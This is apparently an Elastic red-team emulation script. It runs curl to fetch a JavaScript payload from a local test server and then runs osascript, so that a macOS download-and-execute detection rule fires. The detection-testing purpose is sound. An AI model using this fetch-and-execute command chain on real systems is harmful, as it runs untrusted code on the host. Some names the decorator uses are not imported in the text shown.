# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import _common

from time import sleep


@register_code_rta(
    id="9332cece-38b7-49e1-9f8d-e879913ffdfb",
    platforms=[OSType.MACOS],
    endpoint_rules=[
        RuleMetadata(id="871f0c30-a7c5-40a5-80e3-a50c6714632f", name="Download and Execution of JavaScript Payload")
    ],
    siem_rules=[],
    techniques=["T1059"],
)
def main():
    # Setup web server
    _common.serve_web()

    _common.log("Executing commands to download and execute JavaScript payload")
    _common.execute(["curl", "http://127.0.0.1:8000/payload.js"], shell=True)
    sleep(1)
    _common.execute(["osascript", "-l", "JavaScript", "&"], shell=True)


if __name__ == "__main__":
    exit(main())
